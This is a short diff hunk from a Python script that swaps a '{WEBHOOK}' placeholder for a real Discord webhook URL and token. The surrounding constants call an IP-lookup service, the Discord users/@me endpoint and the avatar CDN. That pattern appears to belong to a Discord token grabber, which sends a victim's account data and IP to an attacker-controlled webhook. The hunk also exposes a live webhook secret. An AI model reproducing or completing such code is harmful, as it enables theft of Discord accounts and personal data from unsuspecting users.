@@ -12,7 +12,7 @@ import json
 import urllib.request
 
 # Constants
-WEBHOOK = "{WEBHOOK}"
+WEBHOOK = "https://discord.com/api/webhooks/1337860504567418932/2HQhqG9eH6UgmEHowYa6UbqP9-1Ld89uMzvQc1-qXmetOuxGOB4riXZMHyzumsapR-Si"
 IPIFY_API_URL = "https://api.ipify.org?format=json"
 DISCORD_API_URL = "https://discordapp.com/api/v6/users/@me"
 DISCORD_AVATAR_URL = "https://cdn.discordapp.com/avatars/{id}/{avatar_id}"
